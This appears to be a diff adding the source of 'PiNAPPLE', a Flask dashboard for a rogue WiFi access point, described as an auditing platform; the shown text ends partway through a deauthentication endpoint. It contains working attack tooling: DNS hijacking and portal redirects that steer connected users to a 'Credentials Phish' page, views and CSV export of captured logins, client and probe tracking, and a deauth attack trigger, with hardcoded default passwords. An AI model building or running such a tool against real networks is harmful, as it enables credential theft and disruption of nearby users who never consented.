@@ -1,0 +1,1116 @@
+#!/usr/bin/env python3
+"""PiNAPPLE Dashboard - WiFi Auditing Platform"""
+import os, json, subprocess, csv, io, datetime, glob
+from functools import wraps
+from flask import Flask, request, jsonify, redirect, Response
+from werkzeug.security import check_password_hash, generate_password_hash
+
+app = Flask(__name__)
+
+CONFIG_FILE = '/etc/pinapple/config.json'
+CREDS_LOG = '/var/log/pinapple/creds.log'
+SCAN_JSON = '/var/log/pinapple/scan.json'
+LEASES_FILE = '/var/lib/misc/dnsmasq.leases'
+LOG_DIR = '/var/log/pinapple'
+HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
+FLAG_INTERNET = '/etc/pinapple/internet_enabled'
+FLAG_DNS = '/etc/pinapple/dns_hijack_enabled'
+FLAG_PORTAL = '/etc/pinapple/portal_redirect_enabled'
+ACTIVE_PORTAL = '/opt/pinapple/portal/index.html'
+
+def load_config():
+    defaults = {
+        'username': 'admin',
+        'password_hash': generate_password_hash('pinapple'),
+        'portal_type': 'creds',
+        'mac_randomize': True
+    }
+    try:
+        with open(CONFIG_FILE) as f:
+            cfg = json.load(f)
+            for k, v in defaults.items():
+                if k not in cfg:
+                    cfg[k] = v
+            return cfg
+    except:
+        return defaults
+
+def save_config(cfg):
+    os.makedirs('/etc/pinapple', exist_ok=True)
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump(cfg, f, indent=2)
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        cfg = load_config()
+        if not auth or auth.username != cfg['username'] or \
+           not check_password_hash(cfg['password_hash'], auth.password):
+            return Response('Authentication required', 401,
+                          {'WWW-Authenticate': 'Basic realm="PiNAPPLE"'})
+        return f(*args, **kwargs)
+    return decorated
+
+def service_status(name):
+    r = subprocess.run(['systemctl', 'is-active', name], capture_output=True, text=True)
+    return r.stdout.strip() == 'active'
+
+def monitor_mode_active():
+    r = subprocess.run(['iw', 'dev', 'wlan1', 'info'], capture_output=True, text=True)
+    return 'type monitor' in r.stdout
+
+def get_clients():
+    clients = []
+    try:
+        with open(LEASES_FILE) as f:
+            for line in f:
+                parts = line.strip().split()
+                if len(parts) >= 4:
+                    clients.append({
+                        'expires': datetime.datetime.fromtimestamp(int(parts[0])).isoformat(),
+                        'mac': parts[1], 'ip': parts[2],
+                        'hostname': parts[3] if parts[3] != '*' else 'unknown'
+                    })
+    except:
+        pass
+    return clients
+
+def get_recon():
+    try:
+        with open(SCAN_JSON) as f:
+            return json.load(f)
+    except:
+        return []
+
+def get_creds():
+    entries = []
+    try:
+        with open(CREDS_LOG) as f:
+            for line in f:
+                try:
+                    entries.append(json.loads(line.strip()))
+                except:
+                    pass
+    except:
+        pass
+    return entries
+
+def read_hostapd_conf():
+    cfg = {}
+    try:
+        with open(HOSTAPD_CONF) as f:
+            for line in f:
+                line = line.strip()
+                if '=' in line and not line.startswith('#'):
+                    k, v = line.split('=', 1)
+                    cfg[k.strip()] = v.strip()
+    except:
+        pass
+    return cfg
+
+def write_hostapd_conf(ssid, channel, mode, txpower):
+    pwd_line = ''
+    if mode == 'wpa2':
+        pwd_line = '\nwpa=2\nwpa_passphrase=pinapple123\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP'
+    conf = "interface=wlan0\ndriver=nl80211\nssid={}\nhw_mode=g\nchannel={}\nieee80211n=1\n".format(ssid, channel)
+    conf += "ht_capab=[HT40+][HT40-][SHORT-GI-20][SHORT-GI-40][DSSS_CCK-40]\nwmm_enabled=1\nauth_algs=1\nignore_broadcast_ssid=0"
+    conf += pwd_line + "\n"
+    with open(HOSTAPD_CONF, 'w') as f:
+        f.write(conf)
+
+NAV = """<aside class="sidebar">
+  <div class="sidebar-logo"><div class="logo-icon">&#127821;</div>
+    <div><div class="logo-text">PiNAPPLE</div><div class="logo-sub">WiFi Audit Platform</div></div>
+  </div>
+  <nav>
+    <a href="/" class="{ov}"><span class="nav-icon">&#9711;</span> Overview</a>
+    <a href="/clients" class="{cl}"><span class="nav-icon">&#11042;</span> Clients</a>
+    <a href="/recon" class="{re}"><span class="nav-icon">&#10792;</span> Recon</a>
+    <a href="/creds" class="{cr}"><span class="nav-icon">&#8853;</span> Credentials</a>
+    <a href="/ap-control" class="{ap}"><span class="nav-icon">&#10774;</span> AP Control</a>
+    <a href="/logs" class="{lo}"><span class="nav-icon">&#8801;</span> Logs</a>
+    <a href="/settings" class="{se}"><span class="nav-icon">&#9881;</span> Settings</a>
+    <a href="/wlan1" class="{wl}"><span class="nav-icon">&#9889;</span> WLAN1 Attacks</a>
+  </nav>
+  <div class="sidebar-footer">admin@pinapple</div>
+</aside>"""
+
+CSS = """<style>
+:root{--bg:#0d0d1a;--sb:#12122a;--card:#1a1a35;--bdr:#2a2a4a;--acc:#00d4aa;--acc2:#0099ff;
+  --danger:#ff4757;--warn:#ffa502;--txt:#e0e0e0;--dim:#888;--grn:#2ed573;--red:#ff4757}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',monospace;background:var(--bg);color:var(--txt);display:flex;min-height:100vh}
+.sidebar{width:240px;background:var(--sb);border-right:1px solid var(--bdr);display:flex;flex-direction:column;position:fixed;height:100vh;overflow-y:auto;z-index:100}
+.sidebar-logo{padding:24px 20px;border-bottom:1px solid var(--bdr);display:flex;align-items:center;gap:12px}
+.logo-icon{width:36px;height:36px;background:var(--acc);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.2rem}
+.logo-text{font-weight:700;font-size:1.2rem;color:var(--acc)}.logo-sub{font-size:0.65rem;color:var(--dim)}
+nav{padding:12px 0;flex:1}
+nav a{display:flex;align-items:center;gap:12px;padding:10px 20px;color:var(--dim);text-decoration:none;font-size:0.875rem;transition:all 0.15s;border-left:3px solid transparent}
+nav a:hover{color:var(--txt);background:rgba(0,212,170,0.08)}
+nav a.active{color:var(--acc);background:rgba(0,212,170,0.1);border-left-color:var(--acc)}
+.nav-icon{font-size:1rem;width:20px;text-align:center}
+.sidebar-footer{padding:16px 20px;border-top:1px solid var(--bdr);font-size:0.7rem;color:var(--dim)}
+.main{margin-left:240px;flex:1}
+.topbar{background:var(--sb);border-bottom:1px solid var(--bdr);padding:16px 32px;display:flex;align-items:center;justify-content:space-between}
+.topbar h1{font-size:1.25rem;font-weight:600}
+.content{padding:24px 32px}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;margin-bottom:24px}
+.card{background:var(--card);border:1px solid var(--bdr);border-radius:12px;padding:20px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--acc),var(--acc2))}
+.card-title{font-size:0.75rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.card-value{font-size:2rem;font-weight:700;color:var(--acc)}
+.card-sub{font-size:0.75rem;color:var(--dim);margin-top:4px}
+.sdot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:8px}
+.sdot.on{background:var(--grn);box-shadow:0 0 8px var(--grn);animation:pulse 2s infinite}
+.sdot.off{background:var(--red)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+.scrd{display:flex;align-items:center}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:0.875rem;font-weight:500;transition:all 0.15s;text-decoration:none}
+.btn-acc{background:var(--acc);color:#000}.btn-acc:hover{background:#00b896}
+.btn-danger{background:var(--danger);color:white}.btn-danger:hover{background:#cc3a47}
+.btn-outline{background:transparent;border:1px solid var(--bdr);color:var(--txt)}.btn-outline:hover{border-color:var(--acc);color:var(--acc)}
+.tbtn{padding:6px 14px;border-radius:20px;border:none;cursor:pointer;font-size:0.8rem;font-weight:600;transition:all 0.2s}
+.ton{background:var(--grn);color:#000}.toff{background:var(--bdr);color:var(--dim)}
+table{width:100%;border-collapse:collapse}
+th{padding:12px 16px;text-align:left;font-size:0.75rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--bdr)}
+td{padding:12px 16px;font-size:0.875rem;border-bottom:1px solid rgba(42,42,74,0.5)}
+tr:hover td{background:rgba(0,212,170,0.03)}
+.twrap{background:var(--card);border:1px solid var(--bdr);border-radius:12px;overflow:hidden}
+.sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.st{font-size:0.9rem;font-weight:600;color:var(--txt)}
+.badge{padding:2px 8px;border-radius:4px;font-size:0.7rem;font-weight:600}
+.bg{background:rgba(46,213,115,0.15);color:var(--grn)}.br{background:rgba(255,71,87,0.15);color:var(--red)}
+.bb{background:rgba(0,153,255,0.15);color:var(--acc2)}.bw{background:rgba(255,165,2,0.15);color:var(--warn)}
+.fr{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;margin-bottom:16px}
+.fg{display:flex;flex-direction:column;gap:6px}
+.fg label{font-size:0.8rem;color:var(--dim);text-transform:uppercase;letter-spacing:0.5px}
+.fg input,.fg select{background:var(--bg);border:1px solid var(--bdr);color:var(--txt);padding:10px 14px;border-radius:8px;font-size:0.875rem;outline:none}
+.fg input:focus,.fg select:focus{border-color:var(--acc)}
+.log-area{background:#050510;border:1px solid var(--bdr);border-radius:8px;padding:16px;font-family:monospace;font-size:0.8rem;height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+.le{color:var(--red)}.lw{color:var(--warn)}.li{color:var(--txt)}.ld{color:var(--dim)}
+.tg{display:flex;align-items:center;gap:16px;padding:16px;background:var(--card);border:1px solid var(--bdr);border-radius:12px;margin-bottom:12px}
+.tl{flex:1}.tl strong{display:block;font-size:0.9rem}.tl span{font-size:0.75rem;color:var(--dim)}
+</style>"""
+
+BASE = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>PiNAPPLE &mdash; {title}</title>{css}</head><body>{nav}
+<main class="main"><div class="topbar"><h1>{title}</h1>
+<span style="font-size:0.75rem;color:var(--dim)" id="clk"></span></div>
+<div class="content">{content}</div></main>
+<script>
+function uc(){{document.getElementById('clk').textContent=new Date().toLocaleString();}}
+setInterval(uc,1000);uc();
+async function api(url,method,body){{
+  const o={{method:method||'POST',headers:{{'Content-Type':'application/json'}}}};
+  if(body)o.body=JSON.stringify(body);
+  const r=await fetch(url,o);return r.json();
+}}
+</script>{js}</body></html>"""
+
+def page(title, content, active='', js=''):
+    acts = {k: '' for k in ['ov','cl','re','cr','ap','lo','se','wl']}
+    m = {'overview':'ov','clients':'cl','recon':'re','creds':'cr','ap':'ap','logs':'lo','settings':'se','wl':'wl'}
+    if active in m:
+        acts[m[active]] = 'active'
+    return BASE.format(title=title, css=CSS, nav=NAV.format(**acts), content=content, js=js)
+
+@app.route('/')
+@require_auth
+def overview():
+    ap_ok = service_status('pinapple-ap')
+    dhcp_ok = service_status('pinapple-dhcp')
+    ng_ok = service_status('nginx')
+    mon_ok = monitor_mode_active()
+    clients = get_clients()
+    i_on = os.path.exists(FLAG_INTERNET)
+    d_on = os.path.exists(FLAG_DNS)
+    p_on = os.path.exists(FLAG_PORTAL)
+    uptime = subprocess.run(['uptime','-p'], capture_output=True, text=True).stdout.strip()
+    ssid = read_hostapd_conf().get('ssid','PiNAPPLE')
+    eth_ip = subprocess.run("ip addr show eth0|grep 'inet '|awk '{print $2}'|cut -d/ -f1",
+                           shell=True, capture_output=True, text=True).stdout.strip()
+
+    def sdot(ok): return '<span class="sdot {}"></span>'.format('on' if ok else 'off')
+    def stxt(ok): return '<span style="color:var(--{})">&#9679; {}</span>'.format(
+        'grn' if ok else 'red', 'Running' if ok else 'Stopped')
+
+    c = """<div class="cards">
+  <div class="card"><div class="card-title">Rogue AP</div>
+    <div class="scrd">{ap_d}{ap_t}</div><div class="card-sub">SSID: {ssid}</div></div>
+  <div class="card"><div class="card-title">DHCP/DNS</div>
+    <div class="scrd">{dh_d}{dh_t}</div><div class="card-sub">dnsmasq</div></div>
+  <div class="card"><div class="card-title">Portal (nginx)</div>
+    <div class="scrd">{ng_d}{ng_t}</div><div class="card-sub">nginx</div></div>
+  <div class="card"><div class="card-title">Monitor</div>
+    <div class="scrd">{mn_d}{mn_t}</div><div class="card-sub">wlan1</div></div>
+  <div class="card"><div class="card-title">Clients</div>
+    <div class="card-value">{cc}</div><div class="card-sub">connected</div></div>
+  <div class="card"><div class="card-title">Uptime</div>
+    <div class="card-value" style="font-size:0.9rem;padding-top:8px">{up}</div>
+    <div class="card-sub">{ip}</div></div>
+</div>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+<div>
+<div class="sh"><span class="st">Network Controls</span></div>
+<div class="tg"><div class="tl"><strong>Internet Passthrough</strong><span>NAT wlan0 &rarr; eth0</span></div>
+  <button class="tbtn {ic}" onclick="tog('internet',this)">{it}</button></div>
+<div class="tg"><div class="tl"><strong>DNS Hijack</strong><span>Redirect all DNS to portal</span></div>
+  <button class="tbtn {dc}" onclick="tog('dns-hijack',this)">{dt}</button></div>
+<div class="tg"><div class="tl"><strong>Portal Redirect</strong><span>Redirect HTTP/HTTPS to portal</span></div>
+  <button class="tbtn {pc}" onclick="tog('portal-redirect',this)">{pt}</button></div>
+</div>
+<div>
+<div class="sh"><span class="st">Interfaces</span></div>
+<div class="twrap"><table>
+<tr><th>Interface</th><th>IP</th><th>Status</th></tr>
+<tr><td>eth0</td><td>{eip}</td><td><span class="badge bg">UP</span></td></tr>
+<tr><td>wlan0</td><td>10.0.0.1</td><td><span class="badge {apb}">{aps}</span></td></tr>
+<tr><td>wlan1</td><td>&mdash;</td><td><span class="badge {mnb}">{mns}</span></td></tr>
+</table></div>
+</div></div>""".format(
+        ap_d=sdot(ap_ok), ap_t=stxt(ap_ok), ssid=ssid,
+        dh_d=sdot(dhcp_ok), dh_t=stxt(dhcp_ok),
+        ng_d=sdot(ng_ok), ng_t=stxt(ng_ok),
+        mn_d=sdot(mon_ok), mn_t=stxt(mon_ok),
+        cc=len(clients), up=uptime, ip=eth_ip,
+        ic='ton' if i_on else 'toff', it='ON' if i_on else 'OFF',
+        dc='ton' if d_on else 'toff', dt='ON' if d_on else 'OFF',
+        pc='ton' if p_on else 'toff', pt='ON' if p_on else 'OFF',
+        eip=eth_ip,
+        apb='bg' if ap_ok else 'br', aps='AP' if ap_ok else 'DOWN',
+        mnb='bb' if mon_ok else 'br', mns='MONITOR' if mon_ok else 'DOWN')
+
+    js = """<script>
+async function tog(f,btn){
+  const on=btn.classList.contains('ton');
+  const act=on?'off':'on';
+  const r=await api('/api/toggle/'+f,'POST',{action:act});
+  if(r.ok){btn.textContent=act==='on'?'ON':'OFF';btn.className='tbtn '+(act==='on'?'ton':'toff');}
+  else alert('Error: '+(r.error||'unknown'));
+}
+</script>"""
+    return page('Overview', c, 'overview', js)
+
+@app.route('/api/toggle/<feature>', methods=['POST'])
+@require_auth
+def api_toggle(feature):
+    data = request.json or {}
+    action = data.get('action', 'on')
+    try:
+        if feature == 'internet':
+            subprocess.run(['/usr/local/bin/pinapple-internet', action], check=True)
+            if action == 'on':
+                open(FLAG_INTERNET, 'w').close()
+            else:
+                try: os.remove(FLAG_INTERNET)
+                except: pass
+        elif feature == 'dns-hijack':
+            hc = '/etc/pinapple/dnsmasq-hijack.conf'
+            if action == 'on':
+                with open(hc, 'w') as f: f.write('address=/#/10.0.0.1\n')
+                open(FLAG_DNS, 'w').close()
+            else:
+                with open(hc, 'w') as f: f.write('# DNS hijack disabled\n')
+                try: os.remove(FLAG_DNS)
+                except: pass
+            subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'])
+        elif feature == 'portal-redirect':
+            subprocess.run(['/usr/local/bin/pinapple-portal', action], check=True)
+        else:
+            return jsonify({'ok': False, 'error': 'unknown feature'})
+        return jsonify({'ok': True, 'action': action})
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)})
+
+@app.route('/clients')
+@require_auth
+def clients_page():
+    clients = get_clients()
+    rows = ''.join('<tr><td><code>{}</code></td><td>{}</td><td>{}</td><td>{}</td></tr>'.format(
+        c['mac'], c['ip'], c['hostname'], c['expires']) for c in clients)
+    if not rows:
+        rows = '<tr><td colspan="4" style="text-align:center;color:var(--dim)">No clients</td></tr>'
+    c = """<div class="sh"><span class="st">Connected Clients ({})</span>
+<span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 10s</span></div>
+<div class="twrap"><table><thead><tr><th>MAC</th><th>IP</th><th>Hostname</th><th>Expires</th></tr></thead>
+<tbody id="ct">{}</tbody></table></div>""".format(len(clients), rows)
+    js = """<script>
+async function rc(){
+  const r=await fetch('/api/clients');const d=await r.json();
+  const t=document.getElementById('ct');
+  if(!d.length){t.innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--dim)">No clients</td></tr>';return;}
+  t.innerHTML=d.map(c=>'<tr><td><code>'+c.mac+'</code></td><td>'+c.ip+'</td><td>'+c.hostname+'</td><td>'+c.expires+'</td></tr>').join('');
+}
+setInterval(rc,10000);
+</script>"""
+    return page('Clients', c, 'clients', js)
+
+@app.route('/api/clients')
+@require_auth
+def api_clients():
+    return jsonify(get_clients())
+
+@app.route('/recon')
+@require_auth
+def recon_page():
+    networks = get_recon()
+    def eb(enc):
+        m = {'Open':'br','WEP':'bw','WPA':'bb','WPA2':'bg'}
+        return '<span class="badge {}">{}</span>'.format(m.get(enc,'bb'), enc)
+    rows = ''.join('<tr><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td>{}</td><td>{} dBm</td><td>{}</td><td style="font-size:0.75rem;color:var(--dim)">{}</td></tr>'.format(
+        n.get('ssid','') or '&lt;hidden&gt;', n.get('bssid',''), n.get('channel',0),
+        n.get('signal',0), eb(n.get('encryption','Open')), n.get('first_seen',''))
+        for n in sorted(networks, key=lambda x: x.get('signal',0), reverse=True))
+    if not rows:
+        rows = '<tr><td colspan="6" style="text-align:center;color:var(--dim)">Scanning...</td></tr>'
+    c = """<div class="sh"><span class="st">Nearby Networks ({})</span>
+<span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 30s</span></div>
+<div class="twrap"><table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Signal</th><th>Enc</th><th>First Seen</th></tr></thead>
+<tbody id="rt">{}</tbody></table></div>""".format(len(networks), rows)
+    js = """<script>
+async function rr(){
+  const r=await fetch('/api/recon');const d=await r.json();
+  const mc={Open:'br',WEP:'bw',WPA:'bb',WPA2:'bg'};
+  const t=document.getElementById('rt');
+  if(!d.length){t.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--dim)">Scanning...</td></tr>';return;}
+  t.innerHTML=[...d].sort((a,b)=>b.signal-a.signal).map(n=>'<tr><td>'+(n.ssid||'&lt;hidden&gt;')+'</td><td><code style="font-size:0.75rem">'+(n.bssid||'')+'</code></td><td>'+(n.channel||0)+'</td><td>'+(n.signal||0)+' dBm</td><td><span class="badge '+(mc[n.encryption]||'bb')+'">'+(n.encryption||'?')+'</span></td><td style="font-size:0.75rem;color:var(--dim)">'+(n.first_seen||'')+'</td></tr>').join('');
+}
+setInterval(rr,30000);
+</script>"""
+    return page('Recon', c, 'recon', js)
+
+@app.route('/api/recon')
+@require_auth
+def api_recon():
+    return jsonify(get_recon())
+
+@app.route('/creds')
+@require_auth
+def creds_page():
+    entries = get_creds()
+    def fd(e):
+        return ', '.join('{}:{}'.format(k,v) for k,v in e.get('data',{}).items())
+    rows = ''.join('<tr><td style="font-size:0.75rem">{}</td><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td><span class="badge bb">{}</span></td><td style="font-size:0.8rem">{}</td></tr>'.format(
+        e.get('timestamp',''), e.get('client_ip',''), e.get('client_mac',''),
+        e.get('portal_type',''), fd(e)) for e in entries)
+    if not rows:
+        rows = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No credentials captured yet</td></tr>'
+    c = """<div class="sh"><span class="st">Captured Credentials ({})</span>
+<a href="/api/creds/export" class="btn btn-outline" style="font-size:0.8rem">Export CSV</a></div>
+<div class="twrap"><table><thead><tr><th>Timestamp</th><th>IP</th><th>MAC</th><th>Type</th><th>Data</th></tr></thead>
+<tbody>{}</tbody></table></div>""".format(len(entries), rows)
+    return page('Credentials', c, 'creds')
+
+@app.route('/api/creds/export')
+@require_auth
+def export_creds():
+    entries = get_creds()
+    output = io.StringIO()
+    w = csv.writer(output)
+    w.writerow(['timestamp','client_ip','client_mac','portal_type','data'])
+    for e in entries:
+        w.writerow([e.get('timestamp',''), e.get('client_ip',''),
+                   e.get('client_mac',''), e.get('portal_type',''),
+                   json.dumps(e.get('data',{}))])
+    output.seek(0)
+    return Response(output.getvalue(), mimetype='text/csv',
+                   headers={'Content-Disposition': 'attachment; filename=pinapple_creds.csv'})
+
+@app.route('/ap-control', methods=['GET','POST'])
+@require_auth
+def ap_control():
+    msg = ''
+    if request.method == 'POST':
+        action = request.form.get('action')
+        if action == 'start':
+            r = subprocess.run(['systemctl','start','pinapple-ap'], capture_output=True, text=True)
+            msg = '<span style="color:var(--grn)">AP started.</span>' if r.returncode == 0 else '<span style="color:var(--red)">Error: {}</span>'.format(r.stderr)
+        elif action == 'stop':
+            r = subprocess.run(['systemctl','stop','pinapple-ap'], capture_output=True, text=True)
+            msg = '<span style="color:var(--warn)">AP stopped.</span>' if r.returncode == 0 else '<span style="color:var(--red)">Error: {}</span>'.format(r.stderr)
+        elif action == 'config':
+            ssid = request.form.get('ssid','PiNAPPLE')[:32]
+            channel = int(request.form.get('channel',6))
+            mode = request.form.get('mode','open')
+            txpower = request.form.get('txpower','medium')
+            write_hostapd_conf(ssid, channel, mode, txpower)
+            subprocess.run(['systemctl','restart','pinapple-ap'])
+            msg = '<span style="color:var(--grn)">Config updated and AP restarted.</span>'
+
+    cfg = read_hostapd_conf()
+    ap_run = service_status('pinapple-ap')
+    try:
+        with open(HOSTAPD_CONF) as f:
+            raw = f.read()
+    except:
+        raw = '# not found'
+
+    opts = ''.join('<option value="{}" {}>{}</option>'.format(
+        i, 'selected' if str(i)==cfg.get('channel','6') else '', i) for i in range(1,14))
+
+    mn = '<div style="padding:12px;background:rgba(0,212,170,0.1);border-radius:8px;margin-bottom:16px">{}</div>'.format(msg) if msg else ''
+    c = """{mn}<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
+<div>
+<div class="sh"><span class="st">AP Configuration</span></div>
+<div class="card">
+<form method="POST"><input type="hidden" name="action" value="config">
+<div class="fr">
+  <div class="fg"><label>SSID</label><input name="ssid" value="{ssid}" maxlength="32"></div>
+  <div class="fg"><label>Channel</label><select name="channel">{opts}</select></div>
+</div>
+<div class="fr">
+  <div class="fg"><label>Mode</label><select name="mode">
+    <option value="open">Open</option><option value="wpa2">WPA2-PSK</option>
+  </select></div>
+  <div class="fg"><label>TX Power</label><select name="txpower">
+    <option value="low">Low</option><option value="medium" selected>Medium</option><option value="high">High</option>
+  </select></div>
+</div>
+<button type="submit" class="btn btn-acc">Apply &amp; Restart</button>
+</form>
+<div style="margin-top:16px;display:flex;gap:8px">
+<form method="POST" style="display:inline"><input type="hidden" name="action" value="start">
+  <button class="btn btn-outline">&#9654; Start</button></form>
+<form method="POST" style="display:inline"><input type="hidden" name="action" value="stop">
+  <button class="btn btn-danger">&#9632; Stop</button></form>
+</div></div></div>
+<div>
+<div class="sh"><span class="st">Status</span>
+  <span class="badge {apb}">{aps}</span></div>
+<div class="card"><div class="card-title">hostapd.conf</div>
+<pre style="font-size:0.75rem;color:var(--dim);margin-top:8px;line-height:1.6;overflow-x:auto">{raw}</pre>
+</div></div></div>""".format(mn=mn, ssid=cfg.get('ssid','PiNAPPLE'), opts=opts, raw=raw,
+                              apb='bg' if ap_run else 'br', aps='Running' if ap_run else 'Stopped')
+    return page('AP Control', c, 'ap')
+
+@app.route('/logs')
+@require_auth
+def logs_page():
+    c = """<div class="sh"><span class="st">System Logs</span>
+<select id="ls" onchange="ul()" style="background:var(--card);border:1px solid var(--bdr);color:var(--txt);padding:6px 12px;border-radius:6px">
+  <option value="all">All Logs</option>
+  <option value="dnsmasq">dnsmasq</option>
+  <option value="creds">credentials</option>
+  <option value="scan">scanner</option>
+</select></div>
+<div class="log-area" id="la">Loading...</div>"""
+    js = """<script>
+async function ul(){
+  const s=document.getElementById('ls').value;
+  const r=await fetch('/api/logs?source='+s);const d=await r.json();
+  const a=document.getElementById('la');
+  a.innerHTML=d.lines.map(l=>{
+    let c='li';const ll=l.toLowerCase();
+    if(ll.includes('error')||ll.includes('fail'))c='le';
+    else if(ll.includes('warn'))c='lw';
+    else if(ll.includes('debug'))c='ld';
+    return '<span class="'+c+'">'+l.replace(/</g,'&lt;')+'</span>';
+  }).join('\\n');
+  a.scrollTop=a.scrollHeight;
+}
+setInterval(ul,5000);ul();
+</script>"""
+    return page('Logs', c, 'logs', js)
+
+@app.route('/api/logs')
+@require_auth
+def api_logs():
+    source = request.args.get('source','all')
+    files = {
+        'all': glob.glob(LOG_DIR + '/*.log'),
+        'dnsmasq': [LOG_DIR + '/dnsmasq.log'],
+        'creds': [CREDS_LOG],
+        'scan': [LOG_DIR + '/scanner.log'],
+    }.get(source, [])
+    lines = []
+    for fp in files:
+        try:
+            r = subprocess.run(['tail','-n','50',fp], capture_output=True, text=True)
+            lines.extend(r.stdout.splitlines())
+        except:
+            pass
+    return jsonify({'lines': lines[-100:]})
+
+@app.route('/settings', methods=['GET','POST'])
+@require_auth
+def settings_page():
+    msg = ''
+    cfg = load_config()
+    if request.method == 'POST':
+        action = request.form.get('action')
+        if action == 'portal_type':
+            pt = request.form.get('portal_type','creds')
+            src = '/opt/pinapple/portal/{}.html'.format(pt)
+            if os.path.exists(src):
+                if os.path.lexists(ACTIVE_PORTAL):
+                    os.remove(ACTIVE_PORTAL)
+                os.symlink(src, ACTIVE_PORTAL)
+                cfg['portal_type'] = pt
+                save_config(cfg)
+                subprocess.run(['systemctl','reload','nginx'])
+                msg = '<span style="color:var(--grn)">Portal set to {}</span>'.format(pt)
+        elif action == 'password':
+            pw = request.form.get('new_password','')
+            if len(pw) >= 6:
+                cfg['password_hash'] = generate_password_hash(pw)
+                save_config(cfg)
+                msg = '<span style="color:var(--grn)">Password updated.</span>'
+            else:
+                msg = '<span style="color:var(--red)">Password must be at least 6 chars.</span>'
+
+    portals = [('creds','Credentials Phish','Email + password'),
+               ('hotel','Hotel Portal','Room + last name'),
+               ('splash','Splash Page','Terms only')]
+    popts = ''.join("""<label style="display:flex;align-items:center;gap:12px;padding:12px;border:1px solid var(--{bdr});border-radius:8px;cursor:pointer">
+<input type="radio" name="portal_type" value="{p}" {chk}>
+<div><div style="font-weight:500">{n}</div><div style="font-size:0.75rem;color:var(--dim)">{d}</div></div>
+</label>""".format(p=p, n=n, d=d,
+                   bdr='acc' if cfg.get('portal_type')==p else 'bdr',
+                   chk='checked' if cfg.get('portal_type')==p else '')
+        for p,n,d in portals)
+
+    mn = '<div style="padding:12px;background:rgba(0,212,170,0.1);border-radius:8px;margin-bottom:16px">{}</div>'.format(msg) if msg else ''
+    c = """{mn}<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
+<div>
+<div class="sh"><span class="st">Portal Type</span></div>
+<div class="card">
+<form method="POST"><input type="hidden" name="action" value="portal_type">
+<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">{popts}</div>
+<button type="submit" class="btn btn-acc">Save Portal Type</button>
+</form></div></div>
+<div>
+<div class="sh"><span class="st">Security</span></div>
+<div class="card">
+<form method="POST"><input type="hidden" name="action" value="password">
+<div class="fg" style="margin-bottom:16px">
+  <label>New Dashboard Password</label>
+  <input type="password" name="new_password" placeholder="Min 6 characters">
+</div>
+<button type="submit" class="btn btn-acc">Change Password</button>
+</form></div></div></div>""".format(mn=mn, popts=popts)
+    return page('Settings', c, 'settings')
+
+
+# ============================================================
+# WLAN1 ATTACK FEATURES
+# ============================================================
+import uuid, glob as _glob, signal as _signal
+
+PROBES_LOG   = '/var/log/pinapple/probes.json'
+TRACKER_LOG  = '/var/log/pinapple/clients_seen.json'
+BEACON_PID   = '/var/run/pinapple-beacon.pid'
+BEACON_SSIDS = '/etc/pinapple/beacon_ssids.txt'
+PCAP_DIR     = '/var/log/pinapple'
+
+_hs_jobs = {}  # job_id -> {'status','output','pcap'}
+_beacon_proc = [None]
+
+def get_probes():
+    out = []
+    try:
+        with open(PROBES_LOG) as f:
+            for line in f:
+                try: out.append(json.loads(line.strip()))
+                except: pass
+    except: pass
+    return out
+
+def get_tracker():
+    out = []
+    try:
+        with open(TRACKER_LOG) as f:
+            for line in f:
+                try: out.append(json.loads(line.strip()))
+                except: pass
+    except: pass
+    return sorted(out, key=lambda x: x.get('last_seen',''), reverse=True)
+
+# ---- API ----
+
+@app.route('/api/probes')
+@require_auth
+def api_probes():
+    return jsonify(sorted(get_probes(), key=lambda x: x.get('last_seen',''), reverse=True))
+
+@app.route('/api/tracker')
+@require_auth
+def api_tracker():
+    return jsonify(get_tracker())
+
+@app.route('/api/wlan1/deauth', methods=['POST'])
+@require_auth
+def api_deauth():
+    d = request.json or {}
+    bssid  = d.get('bssid','').strip()
+    client = d.get('client','FF:FF:FF:FF:FF:FF').strip() or 'FF:FF:FF:FF:FF:FF'
+    count  = int(d.get('count', 64))
+    if not bssid:
+        return jsonify({'ok': False, 'error': 'bssid required'})
+    count = max(1, min(count, 500))
+    try:
+        r = subprocess.run(
+            ['python3', '/usr/local/bin/pinapple-deauth', bssid, client, str(count), 'wlan1'],
+            capture_output=True, text=True, timeout=60)
+        output = r.stdout + r.stderr
+        return jsonify({'ok': r.returncode == 0, 'output': output})
